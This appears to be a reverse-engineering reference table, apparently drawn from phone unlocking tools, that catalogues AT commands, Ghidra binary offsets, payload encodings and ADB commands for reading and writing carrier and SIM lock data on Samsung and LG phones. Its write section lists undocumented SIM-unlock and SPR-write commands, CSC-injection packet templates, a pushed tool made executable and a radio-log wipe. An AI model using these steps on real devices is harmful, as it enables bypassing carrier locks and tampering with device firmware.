+[AT-OBS x35]	AT+DEVCONINFO	يعيد MNC(...);MCC(...) — المصدر الأساسي
+[AT-OBS x16]	AT+SVCIFPGM=1,1	Info 2 / Read Mobile Info
+[AT-OBS x34]	AT+CIMI	IMSI — MCC (3) + MNC (2/3) + MSIN
+[AT-OBS x27]	AT+CIMI=?	استعلام النطاق
+[AT-OBS x29]	AT+CPIN?	جاهزية الشريحة قبل CIMI
+[AT-OBS x38]	AT+CSQ	شدة الإشارة — مساعد
+[AT-OBS x27]	AT+CFUN?	حالة الراديو
+[AT-OBS x30]	AT+CFUN=1	تشغيل الراديو
+[AT-OBS x18]	AT+PRECONFG=2	إعداد مسبق للمشغل/المنطقة
+[AT-OBS x2]	AT+PRECONFG=2,0	إعداد مسبق بقيمة 0
+[AT-OBS x4]	AT+RFBYCODE=1,1,0	تغيير CSC/Region
+[AT-OBS x2]	AT+RFBYCODE=2,0,XAA	تغيير CSC إلى XAA
+[AT-OBS x4]	AT+RFBYCODE=2,1,XAA	تغيير CSC إلى XAA
+[AT-OBS x2]	AT+UNLOCKSPR=OLD	فك قفل SPR — Q-Unlocker RAM 0x01BB02CA
+[AT-OBS x2]	AT+SIMLOCKU=0,0,0	بيانات قفل SIM — Q-Unlocker RAM 0x01BAD6D7
+[AT-OBS x8]	AT+SIMLGDATA	بيانات قفل LG SIM
+[AT-BRIDGE]	AT+DEVCONINFO	all_gsm_commands.h:83
+[AT-BRIDGE]	AT+PRECONFG=1,0	all_gsm_commands.h:79
+[AT-BRIDGE]	AT+PRECONFG=2,%s	all_gsm_commands.h:80
+[AT-BRIDGE]	AT+CLCK="PN",2	Network Lock
+[AT-BRIDGE]	AT+CLCK="PU",2	Network Subset Lock
+[AT-BRIDGE]	AT+CLCK="PP",2	Service Provider Lock
+[AT-BRIDGE]	AT+CLCK="PC",2	Corporate Lock
+[AT-BIN]	SRELOCK	Ghidra 0x2aa350 (raw 0x1aa350)
+[AT-BIN]	srelock	Ghidra 0x2aa358
+[AT-BIN]	prefix_cmp(input,"SRELOCK",7)	raw 0x65a30-0x65a40 (يُرجّح strncmp)
+[AT-BIN]	flag [x19+0x32f]	raw 0x65a5c
+[TOOL]	SRELOCK1	Q-Unlocker — relock_extracted_results.txt:20/76/80
+[TOOL]	Invalid MCC-MNC	Q-Unlocker
+[TOOL]	Length of MCC-MNC bytes:	Q-Unlocker — region_results.txt:11/35
+[TOOL]	Select MCC/MNC List	Q-Unlocker — سطر 96/113
+[TOOL]	Search Networks (Country, Operator, MCC, MNC)	Q-Unlocker
+[TOOL]	Carrier Relock / Carrier Relock M1 / M2	Q-Unlocker
+[TOOL]	Carrier Relock Done. Please Reboot Device Manually.	Q-Unlocker
+[TOOL]	Reading All MCC+MNC Available :	KEY-Tool.DMP @0x16a515e / 0x16ba48e
+[TOOL]	MCCMNC.txt	KEY-Tool.DMP @0x16c62c5 (ASCII) / 0x6c0f975 (UTF-16LE)
+[TOOL]	AT_SamMCCMNCTool_V1_arm64_KT	KEY-Tool.DMP @0x6c0f9cf (UTF-16LE)
+[TOOL]	AT_SamMCCMNCTool_V1_KT	KEY-Tool.DMP @0x6c0fb87 (UTF-16LE)
+[TOOL]	MNCReLockSlot(int) / MNCReLockSignal(int)	keytool_dmp_analysis.txt:42
+[TOOL]	listmcc / selectedmcc / lineMCC / lineMNC	keytool_dmp_analysis.txt:43
+[PAYLOAD]	MCCREQ=421F0100421F0200421F0300421F0400421F1000421F1100	24 بايت = 6 سجلات × 4 بايت
+[PAYLOAD]	421F0100	MCC 421 + MNC 01 (Sabaphone)
+[PAYLOAD]	421F0200	MCC 421 + MNC 02 (MTN/Spacetel)
+[PAYLOAD]	421F0300	MCC 421 + MNC 03 (Yemen Mob. CDMA)
+[PAYLOAD]	421F0400	MCC 421 + MNC 04 (HITS/Y Unitel)
+[PAYLOAD]	421F1000	MCC 421 + MNC 10 (أو 16 لو uint16 LE) — غير موجود في القاعدة
+[PAYLOAD]	421F1100	MCC 421 + MNC 11 (أو 17 لو uint16 LE) — غير موجود في القاعدة
+[PAYLOAD]	4-byte record = MCC_BCD (2B) + MNC_BCD (1B) + 0x00	الترميز المرصود
+[PROP]	gsm.sim.operator.numeric	at-bridge:147 — مرصود 14
+[PROP]	gsm.operator.numeric	at-bridge:148 — غير مرصود
+[PROP]	gsm.sim.operator.alpha	اسم مشغل الشريحة
+[PROP]	gsm.sim.operator.iso-country	دولة مشغل الشريحة
+[PROP]	gsm.operator.alpha	مرصود 13
+[PROP]	gsm.operator.iso-country	مرصود 11
+[PROP]	gsm.network.type	مرصود 16
+[PROP]	gsm.sim.state	مرصود 11
+[PROP]	ro.csc.sales_code	at-bridge:142 — مرصود 1
+[PROP]	ro.csc.countryiso_code	at-bridge:143
+[PROP]	ro.boot.carrierid	مرصود 25
+[PROP]	persist.sys.prev_salescode	مرصود 12
+[ADB-OBS x14]	adb -s <serial> shell getprop gsm.sim.operator.numeric
+[ADB-OBS x13]	adb -s <serial> shell getprop gsm.operator.alpha
+[ADB-OBS x11]	adb -s <serial> shell getprop gsm.operator.iso-country
+[ADB-OBS x11]	adb -s <serial> shell getprop gsm.sim.state
+[ADB-OBS x16]	adb -s <serial> shell getprop gsm.network.type
+[ADB-OBS x25]	adb -s <serial> shell getprop ro.boot.carrierid
+[ADB-OBS x12]	adb -s <serial> shell getprop persist.sys.prev_salescode
+[ADB-OBS x1]	adb shell getprop ro.csc.sales_code
+[ADB-OBS x7]	adb shell service call iphonesubinfo 1	IMEI — ليس MCC/MNC
+[ADB-OBS x3]	adb shell service call iphonesubinfo 2	المعنى يختلف حسب الإصدار
+[ADB-OBS x3]	adb shell service call iphonesubinfo 15	المعنى يختلف حسب الإصدار
+[STD]	AT+COPS?	المشغل الحالي
+[STD]	AT+COPS=?	سرد المشغلين مع MCC/MNC
+[STD]	AT+COPS=0	اختيار تلقائي
+[STD]	AT+COPS=1,2,"<MCC><MNC>"	اختيار يدوي
+[STD]	AT+COPS=2	إلغاء التسجيل
+[STD]	AT+COPS=3,2	صيغة numeric
+[STD]	AT+CREG?	تسجيل GSM
+[STD]	AT+CGREG?	تسجيل GPRS
+[STD]	AT+CEREG?	تسجيل LTE
+[STD]	AT+CPOL?	قائمة PLMN مفضلة
+[STD]	AT+CPLS=0/1/2	اختيار قائمة PLMN
+[STD]	adb shell getprop | grep -E "gsm\.(sim\.)?operator\.(numeric|alpha|iso-country)"
+[STD]	adb shell dumpsys telephony.registry | grep -Ei "mcc|mnc|operatorNumeric|countryIso"
+[STD]	adb shell content query --uri content://telephony/carriers --projection numeric,name
+[DB]	mytable: MCC, MCC_int, MNC, MNC_int, ISO, Country, Country_Code, Network, cheched
+[DB]	1688 rows / 225 MCC / 224 countries / 1023 networks
+[DB]	SELECT * FROM mytable WHERE MCC=421 AND MNC=1
+[NOTE]	AT contains 0 MCC/MNC/COPS/CREG/CIMI/IMSI strings out of 141
+[NOTE]	AT+SVCIFPGM response not fully captured
+[NOTE]	AT+COPS / AT+CREG not observed in L24 sessions
+[NOTE]	gsm.operator.numeric declared in at-bridge only
+[NOTE]	AT_SamMCCMNCTool + MCCMNC.txt are names only in KEY-Tool.DMP
+[NOTE]	MCCREQ uses 4-byte records; 3-digit MNC encoding unverified
+[NOTE]	MCCREQ MNC 10/11 vs 16/17 if uint16 LE — unverified
+[NOTE]	SRELOCK prefix compare = 7 chars; payload format after it not fully reversed
+[WRITE][AT-BIN]	SETSPR	كتابة SPR (قائمة قفل المشغل التي تحوي MCC/MNC) — Ghidra 0x2aa2d4 — prefix 6 chars @ raw 0x68828
+[WRITE][AT-BIN]	setspr	نسخة صغيرة — Ghidra 0x2aa2dc — prefix 6 chars @ raw 0x6b26c
+[WRITE][AT-BIN]	GETSPR	قراءة SPR قبل/بعد الكتابة — Ghidra 0x2aa428 — @ raw 0x613cc
+[WRITE][AT-BIN]	EXIT / exit	إنهاء الجلسة — raw 0x69af4 / 0x69bf8
+[WRITE][AT-BIN]	000000000000	Ghidra 0x2aa448 — فحص سجل أصفار @ raw 0x64784
+[WRITE][AT-BIN]	51180004 / 5119010532 / 01426X1	ثوابت بروتوكول الكتابة — 0x2aa430 / 0x2aa2e8 / 0x2aa2f8
+[WRITE][OBS-AT x2]	AT+AKSEEDNO=0	بذرة المصادقة قبل الكتابة
+[WRITE][OBS-AT x4]	AT+AKSEEDNO=1,0	بذرة المصادقة قبل الكتابة
+[WRITE][OBS-AT x18]	AT+PRECONFG=2	كتابة preconfig (مشغل/منطقة)
+[WRITE][OBS-AT x2]	AT+UNLOCKSPR=OLD	فك قفل SPR
+[WRITE][OBS-AT x2]	AT+SIMLOCKU=0,0,0	التحكم في قفل SIM
+[WRITE][OBS-AT x8]	AT+SIMLGDATA=<...>	كتابة بيانات قفل LG SIM
+[WRITE][TOOL]	adb push <file> /data/local/tmp/athun + chmod 0777	دفع الأداة وتفعيلها (x2 لكل أمر)
+[WRITE][TOOL]	GETSPR → SETSPR → Result : OK → exit/EXIT	تسلسل قراءة/كتابة SPR — Q-Unlocker
+[WRITE][TOOL]	Reading All MCC+MNC Available → Writing SIMLock Blob → Writing Shared2 Blob → - Writing SIMLock	KEY-Tool
+[WRITE][TOOL]	Add Manual + lineMCC + lineMNC	إضافة MCC/MNC يدوياً — واجهة KEY-Tool
+[WRITE][TOOL]	Select MCC/MNC List → MCCREQ → apirelock/ → SRELOCK1	مسار Carrier Relock بقائمة MCC/MNC
+[WRITE][TOOL]	TMB-TMK-VZW-APP-AIO-XAU	المشغلون المدعومون لإعادة القفل
+[WRITE][OBS-ADB x2]	adb shell pm uninstall -k --user -0 com.sec.android.AutoPreconfig	إزالة preconfig
+[WRITE][OBS-ADB x2]	adb shell pm uninstall -k --user 0 com.sec.android.CarrierCodeChanger	إزالة مغيّر كود المشغل
+[WRITE][OBS-ADB x2]	adb shell content insert --uri content://com.lge.node/omadm_node --bind key:s:OMADM_SIMLOCK --bind value:i:2	كتابة علم قفل LG SIM
+[WRITE][OBS-AT x4]	adb shell logcat -b radio -c	تنظيف سجل الراديو
+[WRITE][AT-BRIDGE]	0601000E0000%s0000%s / 060100090000%s / 060100120000%s0000%s%s	حِزم حقن CSC (1/5..3/5)
+[WRITE][STD]	AT+CPOL=<index>,2,"<MCCMNC>"	إضافة/تعديل MCC/MNC في قائمة PLMN المفضلة
+[WRITE][STD]	AT+CPOL=<index>	حذف مدخل من القائمة
+[WRITE][STD]	AT+CPLS=0/1/2	اختيار القائمة (SIM/USIM/OPLMN)
+[WRITE][STD]	AT+COPS=1,2,"<MCCMNC>"	اختيار يدوي (لا يُضاف للقائمة)
+[WRITE][STD]	AT+CLCK="PN",1,"<pwd>"	تفعيل Network Lock (1=قفل، 0=فك، 2=استعلام)
+[WRITE][STD]	adb shell content insert --uri content://telephony/carriers --bind numeric:s:"<MCCMNC>" ...	إضافة APN بـMCC/MNC
+[NOTE]	لا يوجد أمر AT معياري لتغيير MCC/MNC المطبوع في الشريحة (IMSI)
+[NOTE]	SETSPR/GETSPR لم يُرصدا في سجلات L24 — دليلهما AT + استخراج Q-Unlocker
